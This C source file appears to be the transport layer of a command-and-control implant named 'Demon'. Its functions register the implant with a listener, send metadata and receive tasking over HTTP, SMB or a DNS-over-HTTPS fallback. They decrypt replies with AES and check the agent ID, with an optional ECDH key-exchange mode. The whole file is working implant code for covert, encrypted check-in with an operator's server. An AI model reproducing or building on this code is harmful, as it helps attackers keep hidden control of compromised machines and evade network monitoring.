#include <Demon.h>

#include <common/Macros.h>

#include <core/Package.h>
#include <core/Transport.h>
#include <core/MiniStd.h>
#include <core/TransportHttp.h>
#include <core/TransportSmb.h>
#include <core/TransportDoH.h>

#include <crypt/AesCrypt.h>

BOOL TransportInit( )
{
    PUTS_DONT_SEND( "Connecting to listener" )
    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

#ifdef ARCHON_ECDH_MODE
    /* ECDH registration: send the pre-built registration packet and parse the
     * response to obtain the connection_id and confirm the session key.
     * This path short-circuits the legacy AES-CTR PackageTransmitNow path. */
    if ( Instance->ECDH.RegPacket && Instance->ECDH.RegPacketLen > 0 ) {
        PVOID  RespData  = NULL;
        SIZE_T RespSize  = 0;
        UINT8  ConnId[16];
        UINT32 AgentId   = 0;

        MemSet( ConnId, 0, sizeof( ConnId ) );

        if ( TransportSend( Instance->ECDH.RegPacket, Instance->ECDH.RegPacketLen,
                            &RespData, &RespSize ) ) {
            if ( RespData && RespSize >= (SIZE_T)ECDH_REG_RESP_MIN &&
                 ecdh_parse_registration_response(
                     Instance->ECDH.SessionKey,
                     (const ei_u8 *)RespData, (ei_size_t)RespSize,
                     ConnId, &AgentId ) ) {
                MemCopy( Instance->ECDH.ConnectionId, ConnId, 16 );
                Instance->ECDH.Active       = TRUE;
                Instance->Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        return Success;
    }
#endif

    /* Sends to our connection (direct/pivot) */
#ifdef TRANSPORT_HTTP
    if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };

        /* Decrypt what we got */
        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Data, Size );

        if ( Data )
        {
            if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance->Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
#endif

#ifdef TRANSPORT_SMB
    if ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
    {
        Instance->Session.Connected = TRUE;
        Success = TRUE;
    }
#endif

#ifdef TRANSPORT_DOH
    /* DoH acts as a fallback — only attempt if no other transport succeeded. */
    if ( !Success && Instance->Config.Transport.DoHDomain )
    {
        if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
        {
            AESCTX AesCtx = { 0 };

            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
            AesXCryptBuffer( &AesCtx, Data, Size );

            if ( Data )
            {
                if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
                {
                    Instance->Session.Connected = TRUE;
                    Success = TRUE;
                }
            }
        }
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Send = { 0 };
    BUFFER Resp = { 0 };

    Send.Buffer = Data;
    Send.Length = Size;

#ifdef TRANSPORT_HTTP

    if ( HttpSend( &Send, &Resp ) )
    {
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

#endif

#ifdef TRANSPORT_SMB

    if ( SmbSend( &Send ) )
    {
        return TRUE;
    }

#endif

#ifdef TRANSPORT_DOH

    /* DoH fallback — only attempt if primary transport failed and
     * a DoH domain is configured in the profile. */
    if ( Instance->Config.Transport.DoHDomain )
    {
        if ( DoHSend( &Send, &Resp ) )
        {
            if ( RecvData )
                *RecvData = Resp.Buffer;

            if ( RecvSize )
                *RecvSize = Resp.Length;

            return TRUE;
        }
    }

#endif

    return FALSE;
}

#ifdef TRANSPORT_SMB

BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Resp = { 0 };

    if ( RecvData )
        *RecvData = NULL;

    if ( RecvSize )
        *RecvSize = 0;

    if ( SmbRecv( &Resp ) )
    {
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

    return FALSE;
}

#endif
